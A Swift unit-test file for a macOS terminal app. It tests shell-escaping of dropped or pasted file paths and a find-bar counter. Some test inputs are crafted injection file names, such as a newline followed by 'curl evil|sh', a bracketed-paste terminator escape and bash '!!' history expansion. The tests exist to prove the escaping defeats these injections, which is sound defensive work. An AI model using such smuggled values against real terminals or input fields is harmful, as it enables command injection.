import AppKit
@testable import GhosttyBridge
@testable import HangarUI
import Testing

/// Drops and ⌘V insert the same text; the find bar's counter (HD-159).
@MainActor @Suite struct TerminalDropSearchTests {
    private func pasteboard(_ fill: (NSPasteboard) -> Void) -> NSPasteboard {
        let pb = NSPasteboard(name: NSPasteboard.Name("hangar-test-\(UUID().uuidString)"))
        pb.clearContents()
        fill(pb)
        return pb
    }

    @Test func filesBecomeEscapedPathsJoinedBySpaces() {
        let pb = pasteboard { $0.writeObjects([URL(fileURLWithPath: "/tmp/a b/Снимок (1).png") as NSURL, URL(fileURLWithPath: "/tmp/x$y") as NSURL]) }
        defer { pb.releaseGlobally() }
        #expect(TerminalSurfaceView.pasteText(pb) == #"/tmp/a\ b/Снимок\ \(1\).png /tmp/x\$y"#)
    }

    /// A file name with a newline, CR or ESC stays one shell word: `$'…'` with `\xHH`, nothing raw left (HD-159).
    @Test func controlCharactersInNamesAreQuoted() {
        #expect(TerminalSurfaceView.shellEscape("/tmp/a\ncurl evil|sh") == #"$'/tmp/a\x0acurl evil|sh'"#)
        #expect(TerminalSurfaceView.shellEscape("/x\u{1b}[201~\r'q\\") == #"$'/x\x1b[201~\x0d\x27q\\'"#)
        // Interactive bash's history expansion (`!!`) is not stopped by $'…': no raw `!` or `'` inside.
        #expect(TerminalSurfaceView.shellEscape("/x\n'!!") == #"$'/x\x0a\x27\x21\x21'"#)
        #expect(TerminalSurfaceView.shellEscape("/x\u{85}é") == #"$'/x\xc2\x85é'"#)
        for name in ["/a\nb", "/a\rb", "/a\u{1b}b", "/a\u{7f}b"] {
            #expect(!TerminalSurfaceView.shellEscape(name).unicodeScalars.contains { $0.value < 0x20 || (0x7f...0x9f).contains($0.value) })
        }
        #expect(TerminalSurfaceView.shellEscape("/tmp/a b") == #"/tmp/a\ b"#)
    }

    @Test func textStaysAsIsAndWebURLsUnescaped() {
        let text = pasteboard { $0.setString("echo 'hi' && ls", forType: .string) }
        defer { text.releaseGlobally() }
        #expect(TerminalSurfaceView.pasteText(text) == "echo 'hi' && ls")
        let web = pasteboard { $0.writeObjects([URL(string: "https://example.com/a?b=1")! as NSURL]) }
        defer { web.releaseGlobally() }
        #expect(TerminalSurfaceView.pasteText(web) == "https://example.com/a?b=1")
        let empty = pasteboard { _ in }
        defer { empty.releaseGlobally() }
        #expect(TerminalSurfaceView.pasteText(empty) == nil)
    }

    @Test func findCounter() {
        #expect(terminalFindCounter(needle: "", selected: 1, total: 5) == nil)
        #expect(terminalFindCounter(needle: "ab", selected: nil, total: nil) == nil)
        #expect(terminalFindCounter(needle: "ab", selected: nil, total: 0) == L10n.terminalFindNone)
        #expect(terminalFindCounter(needle: "ab", selected: nil, total: 12) == L10n.terminalFindCounter("–", 12))
        #expect(terminalFindCounter(needle: "ab", selected: 2, total: 12) == L10n.terminalFindCounter("3", 12))
        #expect(L10n.terminalFindCounter("3", 12).contains("3") && L10n.terminalFindCounter("3", 12).contains("12"))
    }
}
